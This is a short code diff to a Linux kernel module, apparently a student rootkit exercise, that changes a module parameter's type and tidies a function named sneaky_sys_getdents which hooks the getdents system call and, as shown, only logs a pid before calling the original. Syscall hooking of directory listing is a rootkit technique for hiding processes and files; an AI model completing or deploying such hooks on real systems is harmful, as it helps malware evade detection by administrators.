@@ -18,7 +18,7 @@
 
 //
 static int mypid;
-module_param(mypid, pid_t, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+module_param(mypid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
@@ -43,7 +43,6 @@ asmlinkage int (*original_call)(unsigned int fd, struct linux_dirent __user *dir
 asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count){
   printk(KERN_INFO "pid = %d\n", mypid);
   return original_call(fd, dirp, count);
-
 }
 
 //The code that gets executed when the module is loaded
